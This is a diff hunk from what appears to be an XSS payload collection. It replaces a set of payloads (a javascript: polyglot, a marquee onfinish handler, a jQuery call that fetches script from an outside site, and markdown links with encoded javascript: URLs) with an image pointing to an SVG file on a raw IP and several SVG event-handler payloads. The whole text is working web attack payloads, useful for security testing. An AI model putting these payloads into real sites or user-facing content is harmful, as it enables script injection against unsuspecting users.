@@ -1,21 +1,3 @@
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-
-\');confirm(1);//
-
->><marquee loop=1 width=0 onfinish=alert(1)>
-  
-  $.get('http://sakurity.com/jqueryxss')
-  
-  [a](javascript:confirm(1))
-
-[a](javascript://www.google.com%0Aprompt(1))
-
-[a](javascript://%0d%0aconfirm(1))
-
-[a](javascript://%0d%0aconfirm(1);com)
-
-[a](javascript:window.onerror=confirm;throw%201)
-
-[a]: (javascript:prompt(1))
-
-[a]:(�javascript:alert(1))           //Add SOH Character
+ <img src="http://3.87.87.164/SVG_XSS.svg" alt="Smiley face" height="42" width="42"> 
+ 
+ <svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg><svg xmlns="http://www.w3.org/2000/svg"><animation xlink:href="javascript:alert(1)"/></svg><svg xmlns="http://www.w3.org/2000/svg"><foreignObject xlink:href="javascript:alert(1)"/></svg><svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="alert(1)"/> </svg><svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml­events" ev:event="load">alert(1)</handler></svg>
